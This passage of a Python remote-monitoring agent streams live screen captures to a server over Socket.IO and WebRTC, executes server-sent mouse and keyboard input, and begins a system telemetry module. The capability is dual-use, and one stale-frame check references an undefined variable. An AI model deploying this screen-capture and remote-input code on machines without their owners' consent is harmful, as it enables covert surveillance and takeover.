        if force_key: vf.key_frame = True
        packets = self._cc.encode(vf)
        out = b"".join(bytes(p) for p in packets)
        is_key = any(p.is_keyframe for p in packets)
        return out, is_key


class JPEGEncoder:
    def __init__(self, quality=75):
        self._q = quality
        # v10: try to detect turbo-jpeg availability for faster encode
        self._turbo = None
        try:
            import turbojpeg as _tj
            self._turbo = _tj.TurboJPEG()
            log.info(f"Advanced Monitor Encoder: TurboJPEG quality={quality}")
        except Exception:
            log.info(f"Advanced Monitor Encoder: JPEG quality={quality} (no turbojpeg)")

    def encode_frame(self, bgr, force_key=False):
        # v10: TurboJPEG path (fastest — C-level, no Python overhead)
        if self._turbo is not None:
            try:
                import turbojpeg as _tj
                data = self._turbo.encode(bgr, quality=self._q,
                                           pixel_format=_tj.TJPF_BGR,
                                           jpeg_subsample=_tj.TJSAMP_422)
                return data, True
            except Exception as e:
                log.debug(f"JPEGEncoder turbojpeg error: {e}")
        # cv2 path (fast)
        if CV2_OK:
            try:
                ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, self._q])
                return (buf.tobytes() if ok else b""), True
            except Exception as e:
                log.debug(f"JPEGEncoder cv2 error: {e}")
        
        # PIL fallback — always available (bundled with PyInstaller)
        try:
            from PIL import Image as _PILImage
            from io import BytesIO as _BytesIO
            import numpy as _np

            if isinstance(bgr, _PILImage.Image):
                img = bgr
            else:
                arr = _np.array(bgr, dtype=_np.uint8)
                # bgr -> rgb (reverse last axis if it's BGR)
                rgb = arr[:, :, ::-1]
                img = _PILImage.fromarray(rgb, "RGB")
            
            buf = _BytesIO()
            img.save(buf, format="JPEG", quality=self._q, optimize=False)
            return buf.getvalue(), True
        except Exception as e:
            log.debug(f"JPEGEncoder PIL error: {e}")
            return b"", False


def _make_encoder(w, h, fps, quality):
    # Always use JPEG — browsers can't decode H.264 via WebSocket.
    # FIX: PIL fallback means JPEG works even without cv2.
    if not CV2_OK:
        log.warning("Advanced Monitor: cv2 not found — using PIL JPEG encoder (slower but works)")
    else:
        log.info("Advanced Monitor: using JPEG encoder (cv2) for WebSocket relay")
    return JPEGEncoder(quality), FLAG_JPEG


# ── WebRTC peer state (agent-side) ────────────────────────────────────────
_adv_webrtc_peers:    dict = {}   # viewer_sid → RTCPeerConnection
_adv_webrtc_channels: dict = {}   # viewer_sid → RTCDataChannel
_adv_last_frame_pkt:  Optional[bytes] = None


# ── Advanced monitor streaming state (lives on the async loop) ───────────
_adv_sio_async  = None   # socketio.AsyncClient — set when async loop starts
_adv_viewers    = 0
_adv_authed     = False
_adv_last_frame_ts = 0.0
_adv_auth_time     = 0.0   # monotonic time when agent_auth_ok fired
_adv_loop: Optional[asyncio.AbstractEventLoop] = None
_adv_thread: Optional[threading.Thread] = None
_adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")

# Auth event — stream consumer waits on this instead of polling _adv_authed flag.
# Created inside _adv_main on the correct event loop; placeholder here.
_adv_auth_event: Optional[asyncio.Event] = None


def _current_stream_config():
    return (
        int(CONFIG.get("STREAM_MONITOR", 1)),
        int(CONFIG.get("STREAM_FPS", 60)),
        int(CONFIG.get("STREAM_QUALITY", 92)),
        str(CONFIG.get("STREAM_MODE", "screenshot")),
    )

def _init_stream_pipeline():
    """Blocking: initialises capture, grabs one sizing frame, builds encoder.
    Returns (capture, w, h, encoder, enc_flag, differ, fps_ctl).
    The sizing frame is NOT returned — it is discarded after dimension extraction.
    """
    capture = None
    log.info("Advanced Monitor: initializing stream pipeline...")
    _att = 0
    while True:
        try:
            capture = _make_capture()
            sizing = capture.grab()
            if sizing is not None:
                break
            log.warning(f"Advanced Monitor: capture.grab() returned None (attempt {_att+1})")
        except Exception as _ce:
            log.warning(f"Advanced Monitor: capture init error ({_ce}) (attempt {_att+1})")
            capture = None
        _att += 1
        time.sleep(min(30, 2 + _att))

    h, w = sizing.shape[:2]
    encoder, enc_flag = _make_encoder(w, h, CONFIG["STREAM_FPS"], CONFIG["STREAM_QUALITY"])
    differ  = FrameDiffer()
    fps_ctl = AdaptiveFPS(CONFIG["STREAM_FPS"], CONFIG["STREAM_MIN_FPS"])
    log.info(
        f"Advanced Monitor streaming {w}x{h} monitor={CONFIG['STREAM_MONITOR']} @ up to {CONFIG['STREAM_FPS']} fps"
    )
    return capture, w, h, encoder, enc_flag, differ, fps_ctl

import queue as _queue
import threading as _threading_mod


def _producer_thread(
    frame_q: _queue.Queue,
    stop_evt: _threading_mod.Event,
    tick_evt: _threading_mod.Event,
):
    """
    Capture + encode loop running entirely in a normal thread — zero asyncio overhead.

    Ticker: a sibling thread fires tick_evt at exactly 1/fps intervals using
            monotonic-clock compensation, so this loop never drifts.

    Queue:  bounded maxsize=2. When full, oldest item is dropped (drop-oldest
            policy) so the consumer always gets the freshest frame.
    """
    capture = w = h = encoder = enc_flag = differ = fps_ctl = None
    cfg_sig = None
    n = 0
    grab_fails = 0
    enc_pool = ThreadPoolExecutor(max_workers=1, thread_name_prefix="adv-enc-prod")

    def _reset_pipeline():
        nonlocal capture, w, h, encoder, enc_flag, differ, fps_ctl, cfg_sig, n, grab_fails
        if capture:
            try: capture.close()
            except Exception: pass
        capture, w, h, encoder, enc_flag, differ, fps_ctl = _init_stream_pipeline()
        cfg_sig = _current_stream_config()
        n = 0
        grab_fails = 0

    _reset_pipeline()

    while not stop_evt.is_set():
        # Wait for the ticker pulse (replaces asyncio.sleep drift loop)
        tick_evt.wait()
        tick_evt.clear()

        # Config change or excessive failures → reinitialise
        next_sig = _current_stream_config()
        if next_sig != cfg_sig or grab_fails > 10:
            if grab_fails > 10:
                log.warning("Advanced Monitor: too many capture failures — resetting pipeline")
            try:
                _reset_pipeline()
            except Exception as e:
                log.warning(f"Pipeline reset failed: {e}")
                time.sleep(1)
            continue

        # Capture
        try:
            raw = capture.grab()
        except Exception as e:
            log.debug(f"Capture grab error: {e}")
            grab_fails += 1
            continue

        if raw is None:
            grab_fails += 1
            continue
        grab_fails = 0

        # Diff + adaptive FPS
        changed = differ.changed(raw)
        fps_ctl.report(changed)

        # ── Scale: use server-requested scale (default 1.0 = full res) ─────
        h_orig, w_orig = raw.shape[:2]
        scale = float(CONFIG.get("STREAM_SCALE", 1.0))
        if scale < 0.99 and CV2_OK:
            # INTER_AREA is best for downscaling — sharpest, no aliasing
            tw = max(64, int(w_orig * scale))
            th = max(48, int(h_orig * scale))
            small = cv2.resize(raw, (tw, th), interpolation=cv2.INTER_AREA)
            fh, fw = small.shape[:2]
        elif scale < 0.99:
            try:
                from PIL import Image as _PIL
                import numpy as _np
                tw = max(64, int(w_orig * scale))
                th = max(48, int(h_orig * scale))
                img   = _PIL.fromarray(raw[:, :, ::-1], "RGB")
                small = img.resize((tw, th), _PIL.LANCZOS)
                fw, fh = small.size
                small = _np.array(small)[:, :, ::-1]
            except Exception:
                small = raw
                fh, fw = h_orig, w_orig
        else:
            # Full resolution — no downscale
            small = raw
            fh, fw = h_orig, w_orig

        force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)

        # Encode in thread pool so CPU-heavy JPEG doesn't block ticker
        try:
            future  = enc_pool.submit(encoder.encode_frame, small, force_key)
            payload, is_key = future.result(timeout=0.5)
        except Exception as e:
            log.debug(f"Encode error: {e}")
            continue

        if not payload:
            continue

        flags  = enc_flag | (FLAG_KEYFRAME if is_key else 0)
        ts_us  = int(time.time() * 1_000_000)
        header = FRAME_HDR.pack(fw, fh, ts_us, flags, len(payload))
        pkt    = header + payload

        # Drop-oldest when queue is full — keep only the newest frame.
        # v12.2: drain ALL stale frames, not just one, so the consumer
        # always picks up the absolute latest capture.
        while frame_q.full():
            try: frame_q.get_nowait()
            except _queue.Empty: break

        try:
            frame_q.put_nowait(pkt)
        except _queue.Full:
            pass  # race — still safe

        n += 1

    enc_pool.shutdown(wait=False)
    try: capture.close()
    except Exception: pass
    log.info("Producer thread exited.")


def _ticker_thread(stop_evt: _threading_mod.Event, tick_evt: _threading_mod.Event):
    """
    Fires tick_evt at exactly 1/fps intervals using monotonic-clock compensation.
    ENTERPRISE BURST: uses high-resolution sleep with drift correction so the
    actual frame rate matches CONFIG['STREAM_FPS'] even under load.
    """
    next_tick = time.monotonic()
    while not stop_evt.is_set():
        tick_evt.set()
        # v10: dynamically use the current target FPS from CONFIG
        current_fps = max(1, int(CONFIG.get("STREAM_FPS", 60)))
        target_interval = 1.0 / current_fps
        next_tick += target_interval
        now = time.monotonic()
        sleep_for = next_tick - now
        if sleep_for > 0.0001:   # v12.2: 0.1ms minimum — tighter clock for 60fps
            time.sleep(sleep_for)
        elif sleep_for < -target_interval:
            # We've fallen more than one full frame behind — reset clock
            next_tick = time.monotonic()


async def _adv_task_stream_frames():
    """
    Consumer task (async).
    Waits for auth_ok via asyncio.Event — NO polling loop over _adv_authed flag.
    Spawns producer + ticker threads, then drains the queue and emits frames.
    """
    global _adv_last_frame_pkt, _adv_last_frame_ts

    # Wait for auth before doing anything — replaces `if not _adv_authed: sleep(0.1); continue`
    log.info("Stream consumer: waiting for auth_ok…")
    if _adv_auth_event is not None:
        await _adv_auth_event.wait()
    log.info("Stream consumer: auth confirmed — starting producer + ticker")

    frame_q  = _queue.Queue(maxsize=2)   # tight buffer: always newest frame, zero stale backlog
    stop_evt = _threading_mod.Event()
    tick_evt = _threading_mod.Event()

    prod_t = _threading_mod.Thread(
        target=_producer_thread,
        args=(frame_q, stop_evt, tick_evt),
        daemon=True, name="adv-producer",
    )
    tick_t = _threading_mod.Thread(
        target=_ticker_thread,
        args=(stop_evt, tick_evt),
        daemon=True, name="adv-ticker",
    )
    prod_t.start()
    tick_t.start()

    try:
        while True:
            # If auth dropped (disconnect), stop the producer and exit
            if _adv_auth_event is not None and not _adv_auth_event.is_set():
                log.info("Stream consumer: auth cleared — shutting down producer")
                break

            # Drain the queue — always consume the NEWEST frame only.
            # If multiple frames queued (encode burst), skip to the last one
            # so the viewer always sees the most current screen state (live-sync).
            pkt = None
            try:
                while True:
                    pkt = frame_q.get_nowait()
            except _queue.Empty:
                pass

            if pkt is None:
                await asyncio.sleep(0.0005)   # 0.5ms yield — minimal latency
                continue

            # Stale-frame guard: if the frame is >500ms old, discard it.
            # 500ms TTL ensures frames are dropped only if they are significantly late,
            # protecting against backlog while allowing for heavy encoding times.
            if len(pkt) >= 16:
                try:
                    frame_ts_us = int.from_bytes(pkt[8:16], "big")
                    now_us = int(time.time() * 1_000_000)
                    age_ms = (now_us - frame_ts_us) / 1000.0
                    if age_ms > 500:
                        if n % 60 == 0:
                            log.warning(f"Stream consumer: dropping stale frame locally (age={age_ms:.1f}ms)")
                        continue
                except Exception:
                    pass

            _adv_last_frame_pkt = pkt
            _adv_last_frame_ts  = time.monotonic()

            # Emit over Socket.IO (non-blocking fan-out)
            if _adv_sio_async and _adv_sio_async.connected:
                # v10: drop-if-busy emit — ensures the loop never blocks on network IO
                # maintaining perfect mirror sync even on jittery connections.
                if not hasattr(_adv_sio_async, "_emitting"): _adv_sio_async._emitting = False
                if not _adv_sio_async._emitting:
                    _adv_sio_async._emitting = True
                    # v10: Debug print for frame emission
                    if random.random() < 0.01:
                        log.info(f"Emitting frame_bin: {len(pkt)} bytes")
                    async def _do_emit(p):
                        try:
                            await _adv_sio_async.emit("frame_bin", p)
                        except Exception as e:
                            log.debug(f"Socket emit error: {e}")
                        finally:
                            _adv_sio_async._emitting = False
                    asyncio.create_task(_do_emit(pkt))

            # Also push over any open WebRTC DataChannels
            for vsid, dc in list(_adv_webrtc_channels.items()):
                try:
                    if dc.readyState == "open":
                        dc.send(pkt)
                except Exception:
                    _adv_webrtc_channels.pop(vsid, None)

    finally:
        stop_evt.set()
        tick_evt.set()  # unblock ticker so it exits
        log.info("Stream consumer: producer/ticker stop signalled")


async def _adv_task_stream_cursor():
    """v10: 60Hz cursor task with delta suppression and win32 fast path."""
    interval = 1.0 / 60
    lx = ly = -1
    skip = 0  # skip counter for unchanged positions
    while True:
        if _adv_authed:
            try:
                pos = _cursor_relative_to_monitor()
                if pos is None:
                    lx = ly = -1
                    await asyncio.sleep(interval)
                    continue
                x, y = pos
                dx, dy = abs(x - lx), abs(y - ly)
                # v10: delta suppression — only send if moved >1px OR every 2s (keepalive)
                if dx > 1 or dy > 1 or skip >= 120:
                    ts  = int(time.time() * 1000) & 0xFFFFFFFF
                    pkt = CURSOR_HDR.pack(x, y, ts)
                    await _adv_sio_async.emit("cursor_bin", pkt)
                    lx, ly = x, y
                    skip = 0
                else:
                    skip += 1
            except Exception:
                pass
        await asyncio.sleep(interval)


async def _adv_close_peer(viewer_sid: str):
    dc = _adv_webrtc_channels.pop(viewer_sid, None)
    pc = _adv_webrtc_peers.pop(viewer_sid, None)
    try:
        if dc: dc.close()
    except Exception: pass
    try:
        if pc: await pc.close()
    except Exception: pass


async def _adv_main(server_url: str, token: str):
    """Async entry for the advanced monitor — mirrors second-site agent main()."""
    global _adv_sio_async, _adv_authed, _adv_viewers, _adv_auth_event

    # Always strip trailing slash for clean URL
    server_url = server_url.rstrip("/")

    _adv_auth_event = asyncio.Event()
    import socketio as _sio_mod
    sio = _sio_mod.AsyncClient(
        reconnection=True, reconnection_attempts=0,
        reconnection_delay=2, reconnection_delay_max=10,
        logger=False, engineio_logger=False,
    )
    _adv_sio_async = sio

    @sio.event
    async def connect():
        global _adv_authed, _adv_auth_event
        _adv_authed = False
        if _adv_auth_event: _adv_auth_event.clear()
        log.info(f"Advanced Monitor: connected — authenticating…")
        await sio.emit("agent_auth", {
            "token":     token,
            "device_id": CONFIG["DEVICE_TOKEN"],
        })
        # FIX: if auth_ok doesn't arrive within 5s (server restart race),
        # re-send agent_auth automatically — covers the window between main socket
        # agent_connect and adv socket agent_auth
        async def _auth_watchdog():
            await asyncio.sleep(5)
            if not _adv_authed and sio.connected:
                log.info("Advanced Monitor: auth_ok not received after 5s — re-sending agent_auth")
                await sio.emit("agent_auth", {
                    "token":     token,
                    "device_id": CONFIG["DEVICE_TOKEN"],
                })
        asyncio.ensure_future(_auth_watchdog())

    @sio.event
    async def disconnect():
        global _adv_authed, _adv_auth_event
        _adv_authed = False
        if _adv_auth_event: _adv_auth_event.clear()
        log.warning("Advanced Monitor: disconnected — reconnecting…")
        for vsid in list(_adv_webrtc_peers.keys()):
            await _adv_close_peer(vsid)

    @sio.on("auth_ok")
    async def on_auth_ok(data):
        global _adv_authed, _adv_auth_time, _adv_auth_event
        _adv_authed = True
        if _adv_auth_event: _adv_auth_event.set()
        _adv_auth_time = time.monotonic()  # FIX: track when auth completed
        log.info(f"Advanced Monitor authenticated. device_id={data.get('device_id','?')}")
        if not WEBRTC_OK:
            log.info("Advanced Monitor: aiortc not installed — WebRTC disabled, using WebSocket relay")
        await sio.emit("agent_info", {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
        })
        # FIX Issue 1: Ask server to re-send viewer_count in case dashboard connected
        # before this adv socket finished auth (race condition).
        await sio.emit("agent_auth_ready", {
            "token":     token,
            "device_id": CONFIG["DEVICE_TOKEN"],
        })
        # Also proactively request viewer count every 30s to stay in sync
        async def _keep_sync():
            while _adv_authed:
                await asyncio.sleep(10)  # FIX: check every 10s (was 30s) to recover faster from viewer_count race
                if _adv_authed:
                    await sio.emit("agent_auth_ready", {
                        "token":     token,
                        "device_id": CONFIG["DEVICE_TOKEN"],
                    })
        asyncio.create_task(_keep_sync())

    @sio.on("auth_error")
    async def on_auth_error(data):
        """FIXED: Retry auth up to 6 times with 1s backoff before giving up.
        The main socket agent_connect may not have reached the server yet.
        """
        log.warning(f"Advanced Monitor auth failed: {data.get('msg')} — retrying in 2s…")
        await asyncio.sleep(2)
        log.info("Advanced Monitor: re-sending agent_auth…")
        await sio.emit("agent_auth", {
            "token":     token,
            "device_id": CONFIG["DEVICE_TOKEN"],
        })

    @sio.on("viewer_count")
    async def on_viewer_count(data):
        global _adv_viewers
        prev = _adv_viewers
        _adv_viewers = data.get("count", 0)
        if prev == 0 and _adv_viewers > 0:
            log.info(f"Advanced Monitor: viewer connected (count={_adv_viewers}) — stream starting")
        elif _adv_viewers == 0 and prev > 0:
            log.info("Advanced Monitor: all viewers disconnected — stream paused")
        elif _adv_viewers > 0:
            log.debug(f"Advanced Monitor: viewer count update ({_adv_viewers})")

    @sio.on("input_event")
    async def on_input_event(data):
        """Second-site input event handler — absolute pixel coords, ultra-fast win32 path."""
        evt = data.get("type")
        try:
            mx, my = _to_monitor_absolute(
                data.get("x", 0), 
                data.get("y", 0),
                w=data.get("w"),
                h=data.get("h")
            )
            
            # Use win32api for ultra-low latency mouse movement if available
            if evt == "mouse_move":
                if WIN32_OK:
                    win32api.SetCursorPos((mx, my))
                else:
                    pyautogui.moveTo(mx, my, _pause=False)
                return

            # Clicks and other events
            if evt in ("mouse_click", "mouse_dblclick"):
                btn = "left" if data.get("button") == "left" else "right"
                if evt == "mouse_dblclick":
                    pyautogui.doubleClick(mx, my, button=btn, _pause=False)
                elif "down" not in data:
                    pyautogui.click(mx, my, button=btn, _pause=False)
                else:
                    is_down = data.get("down")
                    if WIN32_OK:
                        # Fast win32 path for clicks
                        flags = 0
                        if btn == "left":
                            flags = win32con.MOUSEEVENTF_LEFTDOWN if is_down else win32con.MOUSEEVENTF_LEFTUP
                        else:
                            flags = win32con.MOUSEEVENTF_RIGHTDOWN if is_down else win32con.MOUSEEVENTF_RIGHTUP
                        win32api.mouse_event(flags, 0, 0, 0, 0)
                    else:
                        fn = pyautogui.mouseDown if is_down else pyautogui.mouseUp
                        fn(mx, my, button=btn, _pause=False)
            
            elif evt == "mouse_scroll":
                pyautogui.scroll(int(data.get("delta", 3)), x=mx, y=my, _pause=False)
            
            elif evt == "key_event":
                key = data.get("key", "")
                if not key: return
                is_down = data.get("down")
                # v10: ultra-fast keyboard path via pynput if available
                if PYNPUT_OK:
                    try:
                        from pynput.keyboard import Controller, Key
                        kb = Controller()
                        # Map common special keys
                        special = {
                            "Enter": Key.enter, "Backspace": Key.backspace, "Tab": Key.tab,
                            "Escape": Key.esc, "Delete": Key.delete, "Insert": Key.insert,
                            "Home": Key.home, "End": Key.end, "PageUp": Key.page_up,
                            "PageDown": Key.page_down, "ArrowUp": Key.up, "ArrowDown": Key.down,
                            "ArrowLeft": Key.left, "ArrowRight": Key.right,
                            "Control": Key.ctrl, "Alt": Key.alt, "Shift": Key.shift,
                            "Meta": Key.cmd, "CapsLock": Key.caps_lock, "NumLock": Key.num_lock,
                        }
                        k_obj = special.get(key, key)
                        if is_down:
                            kb.press(k_obj)
                        else:
                            kb.release(k_obj)
                        return
                    except Exception:
                        pass
                # Fallback to pyautogui
                fn = pyautogui.keyDown if is_down else pyautogui.keyUp
                fn(key, _pause=False)
                
            elif evt == "type_text":
                pyautogui.typewrite(data.get("text", ""), interval=0.0, _pause=False)
                
        except Exception as e:
            log.debug(f"Advanced Monitor input error: {e}")

    @sio.on("agent_ping")
    async def on_agent_ping(data):
        await sio.emit("agent_pong", {"ts": data.get("ts", 0)})

    # ── WebRTC signaling ──────────────────────────────────────────────────
    @sio.on("webrtc_offer")
    async def on_webrtc_offer(data):
        if not WEBRTC_OK: return
        viewer_sid = data.get("viewer_sid")
        sdp_data   = data.get("sdp")
        if not viewer_sid or not sdp_data: return
        await _adv_close_peer(viewer_sid)
        try:
            pc = RTCPeerConnection()
            _adv_webrtc_peers[viewer_sid] = pc

            @pc.on("datachannel")
            def on_datachannel(channel):
                if channel.label == "frames":
                    _adv_webrtc_channels[viewer_sid] = channel
                    @channel.on("close")
                    def on_dc_close():
                        _adv_webrtc_channels.pop(viewer_sid, None)

            @pc.on("icecandidate")
            async def on_ice(candidate):
                if candidate:
                    await sio.emit("webrtc_ice_agent", {
                        "viewer_sid": viewer_sid,
                        "candidate": {
                            "candidate": candidate.candidate,
                            "sdpMid": candidate.sdpMid,
                            "sdpMLineIndex": candidate.sdpMLineIndex,
                        },
                    })

            @pc.on("connectionstatechange")
            async def on_state():
                if pc.connectionState in ("failed", "closed", "disconnected"):
                    await _adv_close_peer(viewer_sid)

            offer  = RTCSessionDescription(sdp=sdp_data["sdp"], type=sdp_data["type"])
            await pc.setRemoteDescription(offer)
            answer = await pc.createAnswer()
            await pc.setLocalDescription(answer)
            await sio.emit("webrtc_answer", {
                "viewer_sid": viewer_sid,
                "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type},
            })
        except Exception as e:
            log.error(f"Advanced Monitor WebRTC offer error for viewer={viewer_sid}: {e}")
            await _adv_close_peer(viewer_sid)

    @sio.on("webrtc_ice")
    async def on_webrtc_ice(data):
        if not WEBRTC_OK: return
        viewer_sid = data.get("viewer_sid")
        candidate  = data.get("candidate")
        if not viewer_sid or not candidate: return
        pc = _adv_webrtc_peers.get(viewer_sid)
        if not pc: return
        try:
            ice = RTCIceCandidate(
                candidate=candidate.get("candidate", ""),
                sdpMid=candidate.get("sdpMid"),
                sdpMLineIndex=candidate.get("sdpMLineIndex"),
            )
            await pc.addIceCandidate(ice)
        except Exception as e:
            log.debug(f"Advanced Monitor ICE candidate error: {e}")

    await sio.connect(server_url, transports=["websocket", "polling"])

    # ENTERPRISE: named tasks with crash callbacks — if either task dies the
    # outer _adv_main loop catches it and reconnects the entire adv socket
    frame_task  = asyncio.ensure_future(_adv_task_stream_frames())
    cursor_task = asyncio.ensure_future(_adv_task_stream_cursor())

    def _on_task_done(t):
        if t.cancelled():
            log.info(f"ADV task cancelled: {t.get_coro().__name__}")
        elif t.exception():
            log.error(f"ADV task CRASHED ({t.get_coro().__name__}): {t.exception()} — reconnecting")
        else:
            log.debug(f"ADV task completed: {t.get_coro().__name__}")

    frame_task.add_done_callback(_on_task_done)
    cursor_task.add_done_callback(_on_task_done)
    
    try:
        # v10: return_exceptions=False so any task death triggers a full restart
        await asyncio.gather(frame_task, cursor_task, return_exceptions=False)
    except Exception as e:
        log.error(f"Advanced Monitor tasks died: {e}")
    finally:
        # Ensure no orphan tasks survive to the next reconnect
        frame_task.cancel()
        cursor_task.cancel()
        log.info("Advanced Monitor: tasks cleaned up")


_adv_monitor_started = False  # ensure we only start it once


# ── Main-socket screenshot fallback ─────────────────────────────────────────
# When the adv socket fails to auth, this thread streams screenshots via the
# main socket so both Advanced Monitor and Live Viewer show frames.
_fb_thread: threading.Thread = None
_fb_stop    = threading.Event()

def _start_screenshot_fallback(sio_client):
    """Launch a screenshot-via-main-socket fallback if not already running."""
    global _fb_thread, _fb_stop
    if _fb_thread and _fb_thread.is_alive():
        return
    _fb_stop.clear()

    def _fb_loop():
        log.info("Screenshot fallback: starting main-socket frame relay")
        import struct as _struct
        FLAG_JPEG = 0x02
        FRAME_HDR = _struct.Struct(">IIQII")
        fps = quality = None
        interval = 1.0 / 15
        cap = None
        cfg_sig = None
        n = 0
        grab_fails = 0
        while not _fb_stop.is_set():
            try:
                # ENTERPRISE: only stop fallback when adv socket sustains < 0.5s between frames
                if (
                    _adv_authed and _adv_sio_async and _adv_sio_async.connected
                    and (time.monotonic() - _adv_last_frame_ts) < 0.25  # v10: 250ms
                ):
                    log.info("Screenshot fallback: adv socket sustaining stream — stopping fallback")
                    break

                next_sig = _current_stream_config()
                if next_sig != cfg_sig or cap is None or grab_fails > 10:
                    if grab_fails > 10:
                        log.warning("Screenshot fallback: too many capture failures — resetting")
                    if cap:
                        try: cap.close()
                        except Exception: pass
                    fps = next_sig[1]
                    quality = next_sig[2]
                    interval = 1.0 / max(1, min(fps, 30))
                    cap = _make_capture()
                    cfg_sig = next_sig
                    grab_fails = 0
                    log.info(f"Screenshot fallback: reconfigured monitor={next_sig[0]} fps={fps} quality={quality}")

                frame = cap.grab()
                if frame is None:
                    grab_fails += 1
                    time.sleep(interval); continue
                grab_fails = 0

                h, w = frame.shape[:2]
                # Use configurable scale (default 1.0 = full res) with INTER_AREA for quality
                _scale = float(CONFIG.get("STREAM_SCALE", 1.0))
                if CV2_OK:
                    if _scale < 0.99:
                        tw = max(64, int(w * _scale))
                        th = max(48, int(h * _scale))
                        small = cv2.resize(frame, (tw, th), interpolation=cv2.INTER_AREA)
                    else:
                        small = frame
                    ok, buf = cv2.imencode(".jpg", small, [cv2.IMWRITE_JPEG_QUALITY, quality])
                    payload = buf.tobytes() if ok else None
                    if ok:
                        h, w = small.shape[:2]
                else:
                    try:
                        from PIL import Image as _PI
                        from io import BytesIO as _BIO
                        import numpy as _np2
                        rgb = _np2.array(frame)[:, :, ::-1]
                        img = _PI.fromarray(rgb, "RGB")
                        if _scale < 0.99:
                            tw = max(64, int(w * _scale))
                            th = max(48, int(h * _scale))
                            img = img.resize((tw, th), _PI.LANCZOS)
                        _bio = _BIO()
                        img.save(_bio, "JPEG", quality=quality)
                        payload = _bio.getvalue()
                        w, h = img.size
                    except Exception:
                        payload = None
                if not payload:
                    time.sleep(interval); continue
                ts_us   = int(time.time() * 1_000_000)
                header  = FRAME_HDR.pack(w, h, ts_us, FLAG_JPEG, len(payload))
                pkt     = header + payload
                if sio_client and sio_client.connected:
                    try:
                        # v12.2: check frame age before sending — discard stale frames
                        now_us = int(time.time() * 1_000_000)
                        _hdr = struct.pack(">IIQII", w, h, now_us, FLAG_JPEG, len(payload))
                        pkt = _hdr + payload

                        b64_frame = base64.b64encode(payload).decode()
                        b64_pkt   = base64.b64encode(pkt).decode()
                        did = CONFIG["DEVICE_TOKEN"]
                        sio_client.emit("screenshot_result", {
                            "device_id": did,
                            "frame":     b64_frame,
                            "image":     b64_frame,
                            "w": w, "h": h,
                        })
                        # Send binary frame with current timestamp so server/viewer
                        # can apply the same stale-frame guard as the adv socket
                        sio_client.emit("frame_bin_relay", {
                            "device_id": did,
                            "b64": b64_pkt,
                        })
                    except Exception as e:
                        log.debug(f"Screenshot fallback emit error: {e}")
                n += 1
                time.sleep(interval)
            except Exception as e:
                log.debug(f"Screenshot fallback loop error: {e}")
                time.sleep(1)
        if cap:
            try: cap.close()
            except: pass
        log.info("Screenshot fallback: stopped")

    _fb_thread = threading.Thread(target=_fb_loop, daemon=True, name="fb-screenshot")
    _fb_thread.start()


def start_advanced_monitor(server_url: str, token: str):
    """Launch the async advanced monitor engine in a dedicated thread."""
    global _adv_loop, _adv_thread, _adv_monitor_started
    # FIX: check actual thread liveness — flag alone misses crashed threads
    if _adv_monitor_started and _adv_thread and _adv_thread.is_alive():
        log.info("Advanced Monitor already running — skipping restart")
        return
    if _adv_monitor_started:
        log.warning("Advanced Monitor thread died — restarting")
    _adv_monitor_started = True

    def _run():
        global _adv_loop
        _adv_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_adv_loop)
        while True:
            try:
                _adv_loop.run_until_complete(_adv_main(server_url, token))
            except Exception as e:
                log.warning(f"Advanced Monitor loop error: {e} — retrying in 5s")
            time.sleep(5)

    _adv_thread = threading.Thread(target=_run, daemon=True, name="adv-monitor")
    _adv_thread.start()
    log.info("Advanced Monitor engine started (second-site v2.1 engine)")


# ── Stub classes kept for compatibility with non-streaming parts of main agent
# ── Stub classes kept for compile compatibility (not used for streaming) ──
class CursorTracker:
    """Stub — Advanced Monitor engine handles cursor at 60Hz independently."""
    def __init__(self, sio_client): pass
    def get_pos(self): return 0, 0, False, "left"
    def start(self): pass
    def stop(self): pass


class NetworkMonitor:
    """Stub — no longer needed; second-site engine manages its own throughput."""
    def start(self): pass
    def stop(self): pass
    def get_mbps(self): return 0.0


_net_monitor = NetworkMonitor()


class ScreenStreamer:
    """Stub — replaced by Advanced Monitor engine. All calls are no-ops."""
    def __init__(self, sio_client, cursor): pass
    def start(self, **kwargs): pass
    def stop(self): pass
    def on_ack(self): pass
    def capture_single(self): return None
    @property
    def monitor_idx(self): return CONFIG["STREAM_MONITOR"]
    @property
    def fps(self): return CONFIG["STREAM_FPS"]
    @fps.setter
    def fps(self, v): pass
    @property
    def _quality_current(self): return CONFIG["STREAM_QUALITY"]
    @_quality_current.setter
    def _quality_current(self, v): pass
    @property
    def scale(self): return 1.0
    @scale.setter
    def scale(self, v): pass
    def set_mode(self, mode): pass


# ════════════════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY MODULE
# ════════════════════════════════════════════════════════════════════════════
class SystemMonitor:
    def __init__(self, sio_client):
        self.sio       = sio_client
        self.monitoring = False
        self._thread: Optional[threading.Thread] = None

    def start(self, interval: int = 2):
        if self.monitoring:
            return
        self.monitoring = True
        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
        self._thread.start()

    def stop(self):
        self.monitoring = False

    def get_snapshot(self) -> dict:
        vm   = psutil.virtual_memory()
        disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
        net  = psutil.net_io_counters()
        bat  = psutil.sensors_battery()
        swap = psutil.swap_memory()

        stats = {
            "device_id":        CONFIG["DEVICE_TOKEN"],
            "ts":               datetime.utcnow().isoformat(),
            "cpu_percent":      psutil.cpu_percent(interval=0.1),
            "cpu_per_core":     psutil.cpu_percent(percpu=True),
            "cpu_count":        psutil.cpu_count(logical=True),
            "cpu_count_phys":   psutil.cpu_count(logical=False),
            "cpu_freq_mhz":     round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
            "ram_total_gb":     round(vm.total     / (1024**3), 2),
            "ram_used_gb":      round(vm.used      / (1024**3), 2),
            "ram_free_gb":      round(vm.available / (1024**3), 2),
            "ram_percent":      vm.percent,
            "swap_total_gb":    round(swap.total / (1024**3), 2),
            "swap_used_gb":     round(swap.used  / (1024**3), 2),
            "swap_percent":     swap.percent,
            "disk_total_gb":    round(disk.total / (1024**3), 2),
            "disk_used_gb":     round(disk.used  / (1024**3), 2),
            "disk_free_gb":     round(disk.free  / (1024**3), 2),
            "disk_percent":     disk.percent,
            "net_sent_mb":      round(net.bytes_sent / (1024**2), 2),
